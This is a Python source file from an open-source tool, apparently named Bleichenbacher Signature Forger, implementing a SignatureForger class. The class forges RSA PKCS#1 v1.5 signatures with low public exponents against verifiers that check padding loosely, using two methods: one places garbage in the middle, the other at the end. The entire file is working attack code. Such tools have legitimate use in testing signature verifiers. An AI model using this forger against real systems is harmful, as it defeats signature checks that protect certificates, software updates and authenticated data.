#!/usr/bin/python

"""
This file is part of Bleichenbacher Signature Forger v2.0.

Copyright 2016 Filippo Valsorda
Copyright 2017 Peter Hoeg Steffensen
Copyright 2021 Maxim Masiutin

Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
"""

from sys import stderr, exit
from os import urandom
from gmpy2 import get_max_precision, get_context, cbrt, root
from HashInfo import Hash


def getBitAt(idx, val):
    return (val >> idx) & 0x01


def setBitAt(idx, val):
    return val | (0x01 << idx)


def toInt(val):
    return int.from_bytes(val, byteorder="big")


def toBytes(val, arg_len):
    return int.to_bytes(val, length=arg_len, byteorder="big")


class SignatureForger:
    def __init__(self, keysize, hashAlg, modulus, public_exponent, ffcount, quiet):
        self.keysize_bytes = (keysize + 7) // 8
        self.keysize_bits = keysize
        self.hashAlg = Hash(hashAlg)
        self.modulus = modulus
        self.public_exponent = public_exponent
        self.max_precision = None
        self.ffcount = ffcount
        self.quiet = quiet

    def limit_precision(self, aprecision):
        if self.max_precision is None:
            self.max_precision = get_max_precision() - 16
        return min(
            min(aprecision, self.keysize_bits * 128 * self.public_exponent),
            self.max_precision,
        )

    def encodePkcs1Suffix(self, message):
        messageHash = self.hashAlg.digester(message.encode("utf-8")).digest()
        if messageHash[-1] & 0x01 != 0x01:
            print("Hash value must be uneven. Try a different message", file=stderr)
            exit(1)
        suffix = bytes([0]) + self.hashAlg.digestInfo + messageHash
        return suffix

    def constructSignatureSuffix(self, suffix):
        signatureSuffix = 1
        for idx in range(len(suffix) * 8):
            if self.modulus is not None:
                modexp = pow(signatureSuffix, self.public_exponent, self.modulus)
            else:
                modexp = pow(signatureSuffix, self.public_exponent)
            if getBitAt(idx, modexp) != getBitAt(idx, toInt(suffix)):
                signatureSuffix = setBitAt(idx, signatureSuffix)
        return toBytes(signatureSuffix, (signatureSuffix.bit_length() + 7) // 8)

    def addPrefixToSignature(self, signatureSuffix):
        progress = False
        precision = (self.keysize_bits + 7) // 16
        attempts = 0
        prefix = bytes([0x00, 0x01])
        prefix = prefix + ((bytes([0xFF])) * self.ffcount)
        while True:
            get_context().precision = self.limit_precision(precision)
            attempts += 1
            testPrefix = prefix + urandom(self.keysize_bytes - len(prefix))
            signatureCandidate = (
                toBytes(int(cbrt(toInt(testPrefix))), self.keysize_bytes)[
                    : -len(signatureSuffix)
                ]
                + signatureSuffix
            )
            sc = toInt(signatureCandidate)
            if self.modulus is not None:
                modexp = pow(sc, self.public_exponent, self.modulus)
            else:
                modexp = pow(sc, self.public_exponent)
            toCheck = toBytes(modexp, (modexp.bit_length() + 7) // 8)
            if 0 not in toCheck[: -len(signatureSuffix)]:
                if progress:
                    if not self.quiet:
                        print("")
                if attempts > 1:
                    if not self.quiet:
                        print("Found in", attempts, "attempt(s)")
                return signatureCandidate
            precision = precision + ((precision + 3) // 4)
            if attempts == 10:
                progress = True
                if not self.quiet:
                    print("Generating the signature", end="", flush=True)
            if attempts > 10:
                if not self.quiet:
                    print(".", end="", flush=True)
            if attempts > 100 * self.public_exponent:
                if progress:
                    if not self.quiet:
                        print("")
                return None

    def forgeSignature_method_garbage_mid(self, message):
        suffix = self.encodePkcs1Suffix(message)
        signatureSuffix = self.constructSignatureSuffix(suffix)
        signature = self.addPrefixToSignature(signatureSuffix)
        return signature

    def nthroot(self, e, A, prec):
        get_context().precision = prec
        tu = root(A, e)
        return int(tu)

    def forgeSignature_method_garbage_end(self, message):
        attempts = 0
        prefix = bytes([0x00, 0x01])
        prefix = prefix + ((bytes([0xFF])) * self.ffcount)
        suffix = self.encodePkcs1Suffix(message)
        value = prefix + suffix
        numzeros = self.keysize_bytes - len(value)
        plain = value + (bytes([0]) * numzeros)
        plain_int = toInt(plain)
        precision = len(value) * 8
        while True:
            attempts += 1
            signature = self.nthroot(
                self.public_exponent, plain_int, self.limit_precision(precision)
            )
            if self.modulus is not None:
                plain2 = pow(signature, self.public_exponent, self.modulus)
            else:
                plain2 = pow(signature, self.public_exponent)
            plain2_bytes = toBytes(plain2, self.keysize_bytes)
            if plain2_bytes[: len(value)] == value:
                break
            precision = precision * 2
            if attempts > 4:
                return None

        signature_bytes = (signature.bit_length() + 7) // 8
        return toBytes(signature, signature_bytes)
